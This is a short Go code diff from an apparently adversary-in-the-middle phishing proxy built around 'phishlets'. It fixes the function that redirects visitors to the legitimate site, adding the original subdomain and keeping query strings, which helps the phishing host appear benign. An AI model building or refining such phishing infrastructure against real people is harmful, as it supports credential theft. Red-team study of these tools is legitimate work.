@@ -2200,8 +2200,21 @@ func (p *HttpProxy) returnEmptyOK(req *http.Request) (*http.Request, *http.Respo
 func (p *HttpProxy) redirectToLegitSite(req *http.Request) (*http.Request, *http.Response) {
 	pl := p.getPhishletByPhishHost(req.Host)
 	if pl != nil && len(pl.proxyHosts) > 0 {
-		realDomain := pl.proxyHosts[0].domain
+		// Properly construct the real domain: orig_sub + domain
+		origSub := pl.proxyHosts[0].orig_subdomain
+		baseDomain := pl.proxyHosts[0].domain
+		
+		var realDomain string
+		if origSub != "" {
+			realDomain = origSub + "." + baseDomain
+		} else {
+			realDomain = baseDomain
+		}
+		
 		redirectURL := "https://" + realDomain + req.URL.Path
+		if req.URL.RawQuery != "" {
+			redirectURL += "?" + req.URL.RawQuery
+		}
 		
 		resp := goproxy.NewResponse(req, "text/html", 302, "")
 		resp.Header.Set("Location", redirectURL)
